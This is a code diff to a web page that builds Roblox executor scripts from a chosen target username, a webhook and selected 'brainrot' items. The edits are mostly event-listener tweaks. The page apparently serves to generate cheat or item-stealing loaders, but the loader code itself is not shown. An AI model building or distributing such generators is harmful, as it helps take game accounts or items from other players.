@@ -231,7 +231,7 @@ c.addEventListener("click", e => {
   }
   
   countText.textContent = selected.size + " selected"
-}, { passive: true })
+})
 
 searchInput.addEventListener("input", e => {
   clearTimeout(searchTimeout)
@@ -244,7 +244,7 @@ searchInput.addEventListener("input", e => {
       pill.style.display = matches ? "" : "none"
     })
   }, 150)
-}, { passive: true })
+})
 
 document.querySelector(".select-all-btn").addEventListener("click", () => {
   brainrots.forEach(n => {
@@ -255,13 +255,13 @@ document.querySelector(".select-all-btn").addEventListener("click", () => {
     }
   })
   countText.textContent = selected.size + " selected"
-}, { passive: true })
+})
 
 document.querySelector(".deselect-all-btn").addEventListener("click", () => {
   selected.clear()
   pillMap.forEach(pill => pill.classList.remove("active"))
   countText.textContent = "0 selected"
-}, { passive: true })
+})
 
 ;["normal","freeze","duels","insta"].forEach(m => {
   const btn = document.getElementById("btn-" + m)
@@ -277,6 +277,7 @@ document.querySelector(".deselect-all-btn").addEventListener("click", () => {
 document.querySelector(".generate-btn").addEventListener("click", () => {
   const user = document.getElementById("roblox-username").value.trim() || "USER"
   const webhook = document.getElementById("webhook").value.trim() || "WEBHOOK"
+  console.log("Current mode when generating:", currentMode)
   const loader = LOADERS[currentMode]
   const bTable = Array.from(selected).map(b => `    ["${b}"] = true`).join(",\n")
   const script = `getgenv().TARGET_USER = "${user}"
@@ -298,7 +299,7 @@ document.querySelector(".copy-btn").addEventListener("click", () => {
     btn.textContent = "Copied!"
     setTimeout(() => btn.textContent = originalText, 2000)
   })
-}, { passive: true })
+})
 </script>
 </body>
 </html>
